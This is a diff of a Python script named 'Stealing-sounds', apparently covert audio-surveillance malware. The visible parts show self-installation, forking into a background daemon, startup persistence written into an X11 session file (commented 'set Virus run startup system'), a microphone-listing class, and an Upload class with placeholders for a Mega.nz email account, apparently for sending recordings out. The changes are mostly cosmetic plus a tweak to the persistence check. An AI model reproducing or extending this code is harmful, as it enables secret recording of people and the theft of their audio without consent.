@@ -3,13 +3,14 @@
 #   Stealing-sounds   #
 #######################
 
-#!/usr/bin/env python3.6
 from time import ctime
 from sys import implementation, platform, argv
 from shutil import move
 from os import environ, path, mkdir, remove, fork, _exit, EX_OK, chmod
 from concurrent.futures import ThreadPoolExecutor as TPPE
 
+
+####### Install #######
 class Install(object):
     def __init__(self):
         self.sc = argv[0] # name the script
@@ -35,9 +36,10 @@ class Install(object):
                 
             )
             return True
-        
-            
 
+
+
+####### Upload #######
 class Upload(object):
     def __init__(self):
         self.user       = 'Your Email Address' # Your Email in Mega.nz
@@ -64,6 +66,9 @@ class Upload(object):
         except Exception as e:
             return None
 
+
+
+####### Daemon #######
 class Daemon:
     def daemon(func):
         def wrapper(*args, **kwargs):
@@ -75,10 +80,13 @@ class Daemon:
     def backDaemon():
         path = '/etc/X11/Xsession.d/50x11-common_determine-startup'
         try:
-            if '0x00' not in open(path, 'r').read(): open(path, 'a').write('cache')
+            if 'cache' not in open(path, 'r').read(): open(path, 'a').write('cache')
         except FileNotFoundError:
             exit(0)
 
+
+
+####### Microphone Listing ####### 
 class MicrophoneListing(Upload):
     """
     Creates a new ``Microphone`` instance, which represents a physical microphone
@@ -222,7 +230,7 @@ def main():
         obj.main()
     except Exception: 
         pass
-    
+   
     
 if __name__ == "__main__":
 
@@ -233,5 +241,6 @@ if __name__ == "__main__":
         if try_in:
             Daemon.backDaemon()  # set Virus run startup system
     # Start Script
-    main() 
+    main()
     # [+] Listing...
+
